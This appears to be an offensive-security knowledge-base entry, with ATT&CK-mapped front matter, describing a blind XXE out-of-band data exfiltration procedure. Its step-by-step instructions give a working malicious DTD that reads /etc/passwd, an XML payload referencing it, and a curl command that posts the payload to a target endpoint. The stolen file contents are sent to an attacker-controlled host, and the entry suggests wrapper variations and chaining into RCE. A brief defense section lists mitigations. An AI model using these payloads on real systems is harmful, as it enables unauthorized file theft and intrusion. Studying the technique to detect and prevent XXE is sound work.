---
id: 584a5387-1406-4e26-a9f8-3352c8165dcd
name: Blind-XXE-Data-Exfiltration-via-OOB-Attack
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:44.396261+00:00'
updated_at: '2023-04-10T20:24:37.118633+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Exfiltration|TA0010 - Exfiltration]]'
techniques:
  - >-
    [[techniques/Exfiltration Over Alternative Protocol|T1048 - Exfiltration
    Over Alternative Protocol]]
  - >-
    [[techniques/Exploitation for Client Execution|T1203 - Exploitation for
    Client Execution]]
sub_techniques: []
tags:
  - '[[tags/Exploiting blind XXE to exfiltrate data out-of-band]]'
  - '[[tags/XML External Entity]]'
  - '[[tags/XXE OOB Attack (Yunusov, 2013)]]'
commands:
  - '[[commands/curl-send-xml-payload]]'
tools: []
platforms:
  - Web
  - Linux
validated: true
---

# Blind-XXE-Data-Exfiltration-via-OOB-Attack

## Summary

Blind XXE data exfiltration via OOB attack exploits vulnerabilities in applications that parse XML input without proper entity resolution restrictions. By injecting a malicious XML payload that references an external DTD hosted on an attacker-controlled server, sensitive data from the target system (such as file contents) can be exfiltrated out-of-band through HTTP requests to the attacker's server. This 'blind' technique does not rely on direct responses from the vulnerable application but instead captures data via the OOB channel, making it effective against applications that suppress error messages or inline entity expansions.

## Description

This procedure targets XML parsers vulnerable to external entity attacks, particularly blind XXE where in-band data retrieval is blocked. The attack works by defining parameter entities in an external DTD that read local files (e.g., via file:/// URIs) and encode the data into an HTTP request sent to the attacker's server. Common targets include web applications using libraries like libxml2 without disabling external entities (e.g., via libxml_disable_entity_loader). The technique, popularized by Yunusov in 2013, allows exfiltration of files like /etc/passwd or application configs without executing code on the target, though it can chain into RCE if further exploited. It requires the application to process user-supplied XML, such as in upload forms, API endpoints, or SOAP services, and assumes the parser resolves external DTDs over the network.

## Requirements

1. The target application must parse user-supplied XML input and resolve external entities (e.g., no DTD disabling).
2. Attacker must control an external server (e.g., a simple HTTP listener) to host the DTD and receive exfiltrated data.
3. Network access to submit XML payloads to the target (e.g., via POST request to an upload endpoint).
4. Basic tools like curl for sending payloads; no special privileges on the target.

## Defense

- Disable external entity resolution in XML parsers (e.g., set libxml_disable_entity_loader(true) in PHP, or use secure parsers like defusedxml in Python).
- Validate and sanitize XML input to remove or escape entity declarations; use JSON or other formats where possible.
- Implement web application firewalls (WAFs) to detect and block XXE payloads, including OOB DNS/HTTP requests.
- Monitor outbound network traffic for unexpected connections to attacker-controlled domains or IPs from application servers.

## Objectives

1. Exfiltrate sensitive files or data from the target system via out-of-band HTTP requests.
2. Confirm the presence of a blind XXE vulnerability without relying on in-band responses.
3. Chain into further attacks, such as reading configuration files to enable RCE or credential theft.

## Instructions

### Step 1: Set Up Attacker-Controlled Server for DTD Hosting and Data Reception

**Context**: Host the malicious external DTD on your server and prepare to capture incoming OOB requests. This DTD will define entities to read target files and send their contents via HTTP GET to your endpoint. Use a simple web server like Python's http.server or ngrok for public accessibility.

Start a listener on your server (e.g., using netcat or a web log) to monitor incoming requests at http://yourserver.com/exfil.

> Expected: Server ready to serve the DTD at http://yourserver.com/parameterEntity_oob.dtd and log GET requests to http://yourserver.com/?data.

### Step 2: Craft the Malicious XML Payload

**Context**: Create the XML input that references the external DTD. The payload uses parameter entities (%file and %all) to load local file contents and define &send; to trigger the OOB exfiltration. Replace 'yourserver.com' with your actual domain/IP.

Reference the payload code: [[codes/XML-Parameter-Entity-OOB-XXE-Payload]]

Save the DTD content to http://yourserver.com/parameterEntity_oob.dtd:

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://yourserver.com/exfil?%file;'>">
%all;
```

The main XML payload is:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://yourserver.com/parameterEntity_oob.dtd">
<data>&send;</data>
```

> This step defines the entity expansion chain: the external DTD reads the file, constructs a send entity, and triggers the HTTP request with the file contents in the query parameter. Expected: Payload saved locally for submission.

### Step 3: Submit the Payload to the Target Application

**Context**: Inject the crafted XML into the vulnerable endpoint (e.g., a file upload or API that parses XML). Use curl to send a POST request mimicking the application's input format. Adjust the endpoint URL and headers based on the target (e.g., Content-Type: application/xml).

**Command** ([[commands/curl-send-xml-payload]]):

```bash
curl -X POST -H "Content-Type: application/xml" --data "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE data SYSTEM \"http://yourserver.com/parameterEntity_oob.dtd\"><data>&send;</data>" http://target.com/vulnerable-endpoint
```

> This sends the escaped XML payload to the target. If the parser resolves the external DTD, it will trigger the OOB request. Decision point: If the target blocks external DTDs, try variations like data:// or php:// wrappers if applicable. Expected: HTTP 200 or parser acknowledgment from the target (no direct exfil indication).

### Step 4: Monitor and Retrieve Exfiltrated Data

**Context**: Check your server logs for the incoming OOB request containing the file data. The request will appear as a GET to http://yourserver.com/exfil? followed by the file contents (URL-encoded).

Inspect server access logs or listener output for the query parameter.

> Success if the file contents (e.g., /etc/passwd) appear in the query string. If no request arrives within 30-60 seconds, the parser may not resolve externals—retry with different files or endpoints.

**Success Indicators**:
- Incoming HTTP GET request to your exfil endpoint with sensitive data in the query.
- No errors in target response indicating entity blocking.
